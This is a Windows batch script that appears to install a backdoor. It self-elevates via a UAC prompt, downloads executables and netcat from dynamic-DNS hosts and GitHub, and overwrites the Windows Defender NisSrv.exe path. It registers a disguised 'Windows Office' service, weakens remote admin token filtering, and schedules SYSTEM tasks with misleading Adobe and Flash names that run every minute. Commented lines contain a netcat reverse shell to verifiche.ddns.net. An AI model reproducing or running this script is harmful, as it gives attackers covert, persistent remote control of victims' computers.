@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------

::ENTER YOUR CODE BELOW:


rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/plink.exe','%windir%\plink.exe')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/mila.ppk','%windir%\mila.ppk')
rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %temp%\win.bat
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/get.bat','%windir%\get.bat')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
set url=http://config02.addns.org
set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')
%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win32.bat  -O %windir%\win.bat
rem wget --no-check-certificate %urlgit%/wup.exe  -O %windir%\wup.exe
taskkill /f /im woffice.exe
taskkill /f /im wscript.exe
schtasks /delete /tn sys /F
schtasks /delete /tn syskill /F
schtasks /delete /tn office_get /F
wget --no-check-certificate %urlgit%/nc.exe  -O %windir%\nc64.exe
rem wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
wget --no-check-certificate %urlgit%/get.vbs  -O %windir%\get.vbs
wget --no-check-certificate %urlgit%/sys.xml  -O %windir%\sys.xml
wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
wget --no-check-certificate %urlgit%/office_get.xml  -O %windir%\office_get.xml
schtasks /create /tn office_get /xml %windir%\office_get.xml /F
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
rem %windir%\wofficeie1.exe
SLEEP 10
taskkill /f /im wup.exe
rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
copy /y %windir%\woffice.exe 'C:\Program Files\Windows Defender\NisSrv.exe'
sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
net start wup
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
rem schtasks /create /tn sys /xml %windir%\sys.xml /F
rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F


rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe"  /tn syskill /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\get.bat" /tn office_get /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "net start wup" /tn myadobe2 /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im wup.exe" /tn myflash2 /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
rem schtasks /delete /tn sys /F
